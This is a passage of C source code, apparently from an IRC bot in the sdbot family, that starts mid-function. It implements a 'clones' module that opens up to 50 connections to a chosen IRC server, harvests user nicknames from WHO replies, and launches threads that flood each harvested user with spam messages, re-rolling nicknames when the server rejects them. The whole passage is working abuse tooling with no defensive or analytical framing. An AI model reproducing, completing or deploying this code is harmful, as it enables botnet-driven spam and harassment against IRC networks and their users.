				sprintf(buf,"%s %s :%s\n",PRIVMSG,spam_nicks[c],threads2[num].string1);
				send(clone_sockets[i],buf,strlen(buf),0);
				c++;
				if (c == count_sNicks || spam_nicks[c] == NULL) goto end; 	
			}
		}
		Sleep(spam_delay);
	}
	end:;
	memset(spam_nicks,0,sizeof(spam_nicks));
	memset(spam_message,0,sizeof(spam_message));
	return 0;
}

int clone_read(char * line,SOCKET sock)
{
	//ping we must responce whit a pong
	//433 or 432 == invalid nick
	//352 to get nicks to spam to
	//315 start spamming
	//and we just ignore all other shit
	char *s[8];
	char buf[512];
	char buf2[512];
	DWORD id;
	int i;
	s[0] = strtok(line, " ");
	for (i = 1; i < 8; i++) s[i] = strtok(NULL, " ");

	if (!s[0] && !s[1]) return 1;
	if (strcmp("PING", s[0]) == 0) {
		sprintf(buf,"PONG %s\n",s[1]);
		send(sock, buf, strlen(buf), 0);
	}
	else if (strcmp("433",s[1]) == 0 || strcmp("432",s[1]) == 0) {
		memset(buf2,0,sizeof(buf2));
		clone_nick(buf2);
		sprintf(buf,"NICK %s\n",buf2);
		send(sock, buf, strlen(buf), 0);
	}
	else if (strcmp("352",s[1]) == 0 && s[7] != NULL && count_sNicks < 1500 && strlen(s[7]) < 99 && strlen(spam_message) > 2) { strcpy(spam_nicks[count_sNicks],s[7]); count_sNicks++; }
	else if (strcmp("315",s[1]) == 0 && count_sNicks > 0 && strlen(spam_message) > 2) { //start the spam thread
		if ((i = get_emty_thread(0)) == -1) return 0;
		clearthread(i);
		threads2[i].id = 1;
		sprintf(threads2[i].C_name,"Spam %i nicks message %s",count_sNicks,spam_message);
		strcpy(threads2[i].string1,spam_message);
		threads2[i].Threat_Handle = CreateThread(NULL, 0, &spam,(LPVOID)i, 0, &id);
	}
	return 0;
}


DWORD WINAPI connect_clone(LPVOID param)
{
	int c = (int)param;
	clone_data[c].used = TRUE;
	if ((clone_data[c].sock = create_sock(clone_data[c].server,clone_data[c].port)) < 1) goto end; //socket error
	char *line;
	char buf[4096];
	char buffer[4096];
	DWORD er;
	memset(buf,0,sizeof(buf));
	clone_nick(buf);

	sprintf(buffer,"NICK %s\nUSER %s \"hotmail.com\" \"127.0.0.1\" :%s\n",buf,buf,buf);//sdbot uses \r\n thats why it doesnt connect to some servers
        send(clone_data[c].sock, buffer, strlen(buffer), 0);
	memset(buffer,0,sizeof(buffer));
	int t=0;
	int x=0;
	int len=0;
	while (1) {
		memset(buffer,0,sizeof(buffer));
		if ((len = recv(clone_data[c].sock, buffer,sizeof(buffer), 0)) <= 0) 
			break;
		for (t=0;t!=len;t++)
		{
			if (buffer[t] == '\r' || buffer[t] == '\n' || x == 4000) {
				if (x == 0) continue;
				buf[x] = '\0';
				er = clone_read(buf,clone_data[c].sock);
				if (er > 0) goto end;
				memset(buf,0,sizeof(buf));
				x=0;
			}
			else {
				buf[x] = buffer[t];
				x++;
			}

		}
		
	}
	end:;
	clone_data[c].used = FALSE;
	if (clone_data[c].sock > 0) closesocket(clone_data[c].sock);
	//if (clone_data[c].Handle != NULL) CloseHandle(clone_data[c].Handle);
	return 0;
}

//load the clones

void load_clones(char * Clone_Server,int Clone_port,int num_clones) 
{
	int i,x;
	DWORD id;
	for (i=0;i<num_clones;i++)
	{
		for (x=0;x<50;x++)
			if (clone_data[x].used == FALSE) break;
		if (x == 49) break;
		strcpy(clone_data[x].server,Clone_Server);
		clone_data[x].port = Clone_port;
		clone_data[x].used = TRUE;
		CreateThread(NULL, 0, &connect_clone, (LPVOID)x, 0, &id);

	}
}



